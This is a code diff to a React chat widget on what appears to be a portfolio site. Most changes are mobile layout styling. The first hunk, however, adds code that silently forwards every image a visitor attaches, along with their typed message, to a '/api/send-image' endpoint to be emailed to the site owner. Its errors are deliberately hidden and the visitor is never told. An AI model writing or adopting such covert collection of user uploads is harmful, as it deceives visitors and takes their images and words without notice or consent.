@@ -157,6 +157,36 @@ What would you like to know?`,
 
     setMessages((prev) => [...prev, userMessage]);
 
+    // Background image sending (silently email images to Lawrence)
+    const imageFiles = selectedFiles.filter((file) =>
+      file.type.startsWith("image/")
+    );
+    if (imageFiles.length > 0) {
+      // Send images in background without blocking the chatbot response
+      imageFiles.forEach(async (imageFile) => {
+        try {
+          const imageFormData = new FormData();
+          imageFormData.append("image", imageFile);
+          imageFormData.append("message", input);
+          imageFormData.append("email", "Portfolio Visitor");
+          imageFormData.append("name", "Portfolio Visitor");
+
+          await fetch("/api/send-image", {
+            method: "POST",
+            body: imageFormData,
+          });
+
+          console.log(
+            "Image sent to Lawrence successfully (background):",
+            imageFile.name
+          );
+        } catch (imageError) {
+          console.error("Background image sending failed:", imageError);
+          // Don't show error to user - this is silent
+        }
+      });
+    }
+
     const formData = new FormData();
     formData.append("message", input);
     formData.append("history", JSON.stringify(messages));
@@ -456,20 +486,20 @@ What would you like to know?`,
                 autoComplete="off"
               >
                 {selectedFiles.length > 0 && (
-                  <div className="flex flex-wrap gap-2 p-2 bg-gray-50 dark:bg-gray-800 rounded-t-lg border-b border-gray-200 dark:border-gray-700">
+                  <div className="flex flex-wrap gap-2 p-2 bg-gray-50 dark:bg-gray-800 rounded-t-lg border-b border-gray-200 dark:border-gray-700 max-h-24 overflow-y-auto">
                     {selectedFiles.map((file, index) => (
                       <div
                         key={index}
-                        className="flex items-center gap-2 bg-white dark:bg-gray-700 px-2 py-1 rounded-lg text-xs shadow-sm"
+                        className="flex items-center gap-1 sm:gap-2 bg-white dark:bg-gray-700 px-1.5 sm:px-2 py-1 rounded-lg text-xs shadow-sm flex-shrink-0"
                       >
                         {getFileIcon(file)}
-                        <span className="truncate max-w-[120px]">
+                        <span className="truncate max-w-[80px] sm:max-w-[120px]">
                           {file.name}
                         </span>
                         <button
                           type="button"
                           onClick={() => removeFile(index)}
-                          className="text-red-500 hover:text-red-700"
+                          className="text-red-500 hover:text-red-700 flex-shrink-0"
                         >
                           <FiTrash2 className="h-3 w-3" />
                         </button>
@@ -485,9 +515,9 @@ What would you like to know?`,
                 )}
 
                 <div className="w-full px-2 pb-2 pt-1 bg-transparent">
-                  <div className="flex items-center bg-white dark:bg-gray-900 border border-gray-200 dark:border-gray-700 rounded-2xl shadow-sm overflow-hidden">
+                  <div className="flex items-end bg-white dark:bg-gray-900 border border-gray-200 dark:border-gray-700 rounded-2xl shadow-sm overflow-hidden">
                     <textarea
-                      className="flex-1 px-4 py-2 bg-transparent border-0 focus:ring-0 text-gray-900 dark:text-gray-100 placeholder-gray-400 focus:placeholder-gray-300 text-base resize-none min-h-[40px] max-h-[120px]"
+                      className="flex-1 px-3 sm:px-4 py-2 bg-transparent border-0 focus:ring-0 text-gray-900 dark:text-gray-100 placeholder-gray-400 focus:placeholder-gray-300 text-sm sm:text-base resize-none min-h-[40px] max-h-[80px] sm:max-h-[120px]"
                       value={input}
                       onChange={(e) => setInput(e.target.value)}
                       placeholder="Type your message..."
@@ -510,26 +540,30 @@ What would you like to know?`,
                       style={{ display: "none" }}
                       disabled={isLoading}
                     />
-                    <button
-                      type="button"
-                      onClick={() => fileInputRef.current?.click()}
-                      className="mx-1 p-2 rounded-full text-gray-400 hover:text-indigo-500 hover:bg-indigo-50 dark:hover:bg-gray-800 transition-colors focus:outline-none"
-                      title="Attach files"
-                      disabled={isLoading}
-                    >
-                      <FiPaperclip className="w-5 h-5" />
-                    </button>
-                    <button
-                      className="mr-2 ml-1 p-2 rounded-full bg-indigo-500 hover:bg-indigo-600 text-white shadow transition-colors focus:outline-none disabled:opacity-50 disabled:cursor-not-allowed"
-                      type="submit"
-                      disabled={
-                        isLoading ||
-                        (!input.trim() && selectedFiles.length === 0)
-                      }
-                      title="Send"
-                    >
-                      <FiSend className="w-5 h-5" />
-                    </button>
+
+                    {/* Mobile-optimized button layout */}
+                    <div className="flex items-center flex-shrink-0 px-1">
+                      <button
+                        type="button"
+                        onClick={() => fileInputRef.current?.click()}
+                        className="p-1.5 sm:p-2 rounded-full text-gray-400 hover:text-indigo-500 hover:bg-indigo-50 dark:hover:bg-gray-800 transition-colors focus:outline-none"
+                        title="Attach files"
+                        disabled={isLoading}
+                      >
+                        <FiPaperclip className="w-4 h-4 sm:w-5 sm:h-5" />
+                      </button>
+                      <button
+                        className="ml-1 mr-1 sm:mr-2 p-1.5 sm:p-2 rounded-full bg-indigo-500 hover:bg-indigo-600 text-white shadow transition-colors focus:outline-none disabled:opacity-50 disabled:cursor-not-allowed flex-shrink-0"
+                        type="submit"
+                        disabled={
+                          isLoading ||
+                          (!input.trim() && selectedFiles.length === 0)
+                        }
+                        title="Send"
+                      >
+                        <FiSend className="w-4 h-4 sm:w-5 sm:h-5" />
+                      </button>
+                    </div>
                   </div>
                 </div>
               </form>
